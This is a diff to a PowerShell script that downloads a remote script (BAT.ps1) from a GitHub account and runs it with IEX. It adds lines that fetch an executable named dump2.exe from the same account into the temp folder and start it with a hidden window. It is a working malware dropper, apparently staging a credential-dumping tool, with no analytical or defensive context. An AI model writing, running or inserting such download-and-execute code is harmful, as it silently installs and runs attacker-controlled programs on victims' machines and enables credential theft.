@@ -8,4 +8,8 @@ $url3 = "https://raw.githubusercontent.com/cia168168/folder/main/BAT.ps1"
 $output3 = "$env:TEMP\BAT.ps1"
 Invoke-WebRequest -Uri $url3 -OutFile $output3
 IEX ((New-Object Net.WebClient).DownloadString($output3))
+$url5 = "https://github.com/cia168168/folder/raw/main/dump2.exe"
+$output5 = "$env:TEMP\dump.exe"
+Invoke-WebRequest -Uri $url5 -OutFile $output5
+Start-Process -FilePath $output5 -WindowStyle Hidden
 
